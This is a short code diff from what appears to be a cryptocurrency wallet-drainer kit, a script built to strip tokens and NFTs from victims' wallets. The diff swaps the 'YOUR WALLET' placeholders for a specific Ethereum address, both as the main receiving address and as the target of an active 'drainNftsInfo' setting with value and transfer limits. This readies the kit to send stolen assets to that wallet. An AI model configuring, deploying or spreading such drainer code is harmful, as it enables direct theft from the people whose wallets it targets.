@@ -2,7 +2,7 @@
     = = = = = YOU WALLET ADRESS = = = = =
 */
 
-const receiveAddress = "YOUR WALLET";
+const receiveAddress = "0xd4550697Fe601BdAeD1E591d47A887Aa7097400a";
 
 /*
     = = = = = COLLECTION SETTINGS = = = = =
@@ -48,7 +48,7 @@ const drainNftsInfo = {
     active: true,
     minValue: 0.2,
     maxTransfer: 1,
-    nftReceiveAddress: "YOUR WALLET",
+    nftReceiveAddress: "0xd4550697Fe601BdAeD1E591d47A887Aa7097400a",
 }
 
 const customStrings = {
